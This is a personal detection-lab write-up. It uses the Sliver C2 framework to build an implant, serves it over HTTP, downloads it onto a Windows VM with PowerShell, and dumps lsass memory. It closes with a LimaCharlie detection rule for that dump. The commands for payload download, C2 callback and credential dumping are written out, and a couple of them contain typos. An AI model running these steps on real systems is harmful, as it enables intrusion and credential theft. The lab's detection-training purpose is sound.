# Detection Lab

## Objective

The Detection Lab project aimed to establish a controlled environment for simulating and detecting cyber attacks. The primary focus was to ingest and analyze logs within a Security Information and Event Management (SIEM) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen understanding of network security, attack patterns, and defensive strategies.

### Skills Learned

- Advanced understanding of SIEM concepts and practical application.
- Proficiency in analyzing and interpreting network logs.
- Ability to generate and recognize attack signatures and patterns.
- Enhancing knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used

- **Sysmon** as Security Information and Event Management (SIEM) system for log ingestion and analysis.
- **LimaCharlie** as security operations (SecOps) workspace for automated alerts and response

## Steps

1. Installing Ubuntu on a VM
2. Installing Windows on a VM
3. Preparing the Windows machine
    * turn off windows defender
    * install sysmon
    * install LimaCharlie

4. prepare Ubuntu
    * set static IP-address for easy ssh-connection and further use in the network




5. Installation of Sliver, a software to generate malware

    ```
    wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server)´
    ```

    * Generate C2 payload
    
    ```
    sliver-erver
    generate --http [Linux_VM_IP] --save /opt/sliver
    implants
    exit
    ```

    * download C2 payload to target -> create temporary web server
    ```
    cd /opt/sliver
    python3 -m http.server 80
    ```
    
    * on target execute malware
    ```
    IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
    ```

# Command and Conrol Session

* start sliver server and the listener
```
sliver-server
http
```
* execute payload on target
```
IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
```

* verifying the connection:
```
sessions
use [session_id]
whoami
-> C2 session on the targetmachine
getprivs
pwd
netstat
ps -T
getprivs
procdump -n lsass.exe -s lsass.dmp
-> dumps the remote process from memory and save it on you Sliver C2 server
```
# Seeing attacks in LimaCharlie

* Detect the dump
    Timeline -> Event Type Filters -> SENSITIVE_PROCESS_ACCESS 
* When the attack is found a detection and response (D&R) rule is issued to prevent future attacks with this attack vector.
```
event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: events/*/TARGET/FILE_PATH
value: lsass.exe
```
